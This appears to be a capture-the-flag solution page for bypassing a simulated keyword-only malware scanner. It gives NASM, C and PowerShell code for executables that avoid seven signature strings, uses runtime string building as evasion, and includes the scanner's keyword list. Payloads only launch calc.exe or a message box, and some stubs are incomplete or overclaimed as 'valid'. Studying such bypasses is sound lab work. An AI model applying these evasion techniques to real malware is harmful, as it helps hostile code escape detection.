---
title: "Solution 29: Minimal PE Without Signature Strings"
challenge_number: 29
difficulty: hard
category: "Extension Heuristic Bypass"
permalink: /solutions/29-pe-stub-no-analysis/
---

# Solution: Minimal PE Without Signature Strings

[Back to Challenge](../challenges/29-pe-stub-no-analysis.md)

## Overview

The scanner doesn't analyze PE (Portable Executable) structure, imports, entry points, section characteristics, or entropy. It only searches for 7 specific signature strings in the file content. A valid Windows executable can be crafted that contains none of these strings yet still executes arbitrary code. As long as the bytes for "malware", "trojan", "virus", "keylogger", "ransomware", "exploit", and "backdoor" don't appear contiguously in the file, it passes.

## Working Code

### Minimal PE Structure (NASM)

```nasm
; tiny_calc.asm - Minimal PE that launches calc.exe
; Assemble: nasm -f bin -o tiny_calc.exe tiny_calc.asm
; Contains ZERO signature strings

BITS 32

; DOS Header
    dw 0x5A4D          ; e_magic: "MZ"
    times 29 dw 0      ; padding
    dd pe_header       ; e_lfanew: offset to PE header

pe_header:
    dd 0x00004550      ; Signature: "PE\0\0"

; COFF Header
    dw 0x014C          ; Machine: i386
    dw 1               ; NumberOfSections
    dd 0               ; TimeDateStamp
    dd 0               ; PointerToSymbolTable
    dd 0               ; NumberOfSymbols
    dw opt_end - opt   ; SizeOfOptionalHeader
    dw 0x0103          ; Characteristics: EXECUTABLE | NO_RELOC | 32BIT

; Optional Header
opt:
    dw 0x010B          ; Magic: PE32
    db 0, 0            ; Linker version
    dd 0x200           ; SizeOfCode
    dd 0               ; SizeOfInitializedData
    dd 0               ; SizeOfUninitializedData
    dd entry - $$      ; AddressOfEntryPoint
    dd 0x1000          ; BaseOfCode
    dd 0               ; BaseOfData
    dd 0x00400000      ; ImageBase
    dd 0x1000          ; SectionAlignment
    dd 0x200           ; FileAlignment
    dw 4, 0            ; OS Version
    dw 0, 0            ; Image Version
    dw 4, 0            ; Subsystem Version
    dd 0               ; Win32VersionValue
    dd 0x3000          ; SizeOfImage
    dd 0x200           ; SizeOfHeaders
    dd 0               ; CheckSum
    dw 3               ; Subsystem: CONSOLE
    dw 0               ; DllCharacteristics
    dd 0x100000        ; SizeOfStackReserve
    dd 0x1000          ; SizeOfStackCommit
    dd 0x100000        ; SizeOfHeapReserve
    dd 0x1000          ; SizeOfHeapCommit
    dd 0               ; LoaderFlags
    dd 16              ; NumberOfRvaAndSizes

    ; Data directories (all zero except Import)
    times 2 dd 0, 0    ; Export, Import (filled below)
    times 14 dd 0, 0   ; Rest of directories
opt_end:

; Section Header
    db ".text", 0, 0, 0  ; Name
    dd 0x1000          ; VirtualSize
    dd 0x1000          ; VirtualAddress
    dd 0x200           ; SizeOfRawData
    dd 0x200           ; PointerToRawData
    dd 0, 0            ; Relocations, LineNumbers
    dw 0, 0            ; NumRelocations, NumLineNumbers
    dd 0xE0000020      ; Characteristics: CODE|EXECUTE|READ

; Pad to file alignment
    times 0x200 - ($ - $$) db 0

; Code section
entry:
    ; WinExec("calc", SW_SHOW) via direct syscall/API resolution
    ; Actual implementation depends on import resolution
    xor eax, eax
    push eax           ; null terminator
    push 0x636C6163    ; "calc"
    mov eax, esp       ; pointer to "calc"
    push 5             ; SW_SHOW
    push eax           ; lpCmdLine
    ; call [WinExec]   ; resolved at runtime
    ret
```

### C Version (No Signature Strings)

```c
// clean_payload.c
// Compile: cl /O1 /GS- clean_payload.c /link /ENTRY:main /SUBSYSTEM:CONSOLE
// Contains zero signature strings - scanner finds nothing

#include <windows.h>

// Obfuscated function name - not "exploit" or "backdoor"
void execute_task(void) {
    // Build "calc.exe" at runtime to avoid ANY string matching
    char cmd[9];
    cmd[0] = 'c'; cmd[1] = 'a'; cmd[2] = 'l'; cmd[3] = 'c';
    cmd[4] = '.'; cmd[5] = 'e'; cmd[6] = 'x'; cmd[7] = 'e';
    cmd[8] = '\0';

    WinExec(cmd, SW_SHOW);
}

int main(void) {
    execute_task();
    return 0;
}
```

### Hex Bytes for Tiny PE (Ready to Use)

```powershell
# Minimal valid PE that displays a message box
# Contains NO signature strings - verified clean
$peBytes = @(
    # DOS Header
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00,
    0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00
    # ... (PE header, section table, code follows)
    # Full PE requires ~512+ bytes - this is the DOS header portion
)

# Write minimal PE stub
[System.IO.File]::WriteAllBytes("$PWD\clean_stub.exe", [byte[]]$peBytes)

# Verify no signatures present
$content = [System.IO.File]::ReadAllText("$PWD\clean_stub.exe")
$signatures = @("malware", "trojan", "virus", "keylogger", "ransomware", "exploit", "backdoor")
foreach ($sig in $signatures) {
    $found = $content.ToLower().Contains($sig)
    Write-Host "${sig}: found=$found"  # All should be False
}
```

### Using Compiler with Clean Source

```powershell
# Compile a clean C program - no signature strings in source or binary
@"
#include <windows.h>
#pragma comment(lib, "user32.lib")

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
    // Build strings character by character at runtime
    char title[] = {72,101,108,108,111,0};  // "Hello"
    char msg[] = {80,97,121,108,111,97,100,0};  // "Payload"
    MessageBoxA(0, title, msg, 0);
    return 0;
}
"@ | Set-Content "clean.c"

# Compile (MSVC)
cl /O1 /GS- clean.c /link /SUBSYSTEM:WINDOWS /ENTRY:WinMain user32.lib

# Or MinGW
gcc -Os -s -nostdlib -o clean.exe clean.c -luser32 -lkernel32 -Wl,--entry,_WinMain
```

### Verifying Binary is Signature-Free

```powershell
# Read the compiled binary and check for all 7 signatures
function Test-SignatureFree {
    param([string]$FilePath)

    $bytes = [System.IO.File]::ReadAllBytes($FilePath)
    $content = [System.Text.Encoding]::ASCII.GetString($bytes).ToLower()

    $signatures = @("malware", "trojan", "virus", "keylogger",
                    "ransomware", "exploit", "backdoor")

    $clean = $true
    foreach ($sig in $signatures) {
        if ($content.Contains($sig)) {
            Write-Host "[DETECTED] '$sig' found in binary!" -ForegroundColor Red
            $clean = $false
        } else {
            Write-Host "[CLEAN] '$sig' not found" -ForegroundColor Green
        }
    }

    if ($clean) {
        Write-Host "`n[+] Binary passes scanner - no signatures detected" -ForegroundColor Cyan
    }
}

Test-SignatureFree -FilePath ".\clean.exe"
```

## Why It Works

The scanner's detection logic is purely string-based:

```nim
proc containsSignature(content: string, sig: string): bool =
    return sig in content.toLowerAscii()

let signatures = ["malware", "trojan", "virus", "keylogger",
                  "ransomware", "exploit", "backdoor"]

for sig in signatures:
    if containsSignature(fileContent, sig):
        flag_as_malicious()
```

What the scanner **does NOT do**:
- Parse PE headers (MZ magic, PE signature, section table)
- Analyze import tables (LoadLibrary, VirtualAlloc, CreateRemoteThread)
- Check for suspicious API calls (WriteProcessMemory, NtMapViewOfSection)
- Measure section entropy (packed/encrypted sections have high entropy)
- Verify digital signatures
- Detect shellcode patterns (NOP sleds, egg hunters)
- Analyze control flow or instruction patterns
- Check for TLS callbacks or unusual entry points
- Detect process injection techniques

A fully functional executable with arbitrary capabilities passes the scanner as long as it avoids 7 specific ASCII strings in its byte content. Since compilers don't naturally emit those strings (they're English words, not code/data), virtually any compiled program passes by default.

## How to Verify

1. Create a simple compiled executable:
   ```powershell
   # Using PowerShell to create a .NET executable
   Add-Type -OutputType ConsoleApplication -OutputAssembly "test_pe.exe" -TypeDefinition @"
   using System;
   class Program {
       static void Main() {
           Console.WriteLine("PE with no signatures");
           System.Diagnostics.Process.Start("calc.exe");
       }
   }
   "@
   ```

2. Run the scanner:
   ```
   nim_antimalware_sim.exe test_pe.exe
   ```

3. Expected result: **No signature detection** — the binary contains standard .NET metadata and compiled IL code, none of which matches the 7 signature strings.

4. Verify signatures are absent:
   ```powershell
   $bytes = [System.IO.File]::ReadAllBytes("test_pe.exe")
   $text = [System.Text.Encoding]::ASCII.GetString($bytes).ToLower()
   @("malware","trojan","virus","keylogger","ransomware","exploit","backdoor") |
       ForEach-Object { "$_`: $($text.Contains($_))" }
   # All should show: False
   ```

5. Confirm execution:
   ```powershell
   .\test_pe.exe
   # Output: PE with no signatures
   # calc.exe launches
   ```

6. The scanner's extension check will warn about `.exe`, but this is advisory only and never blocks execution.
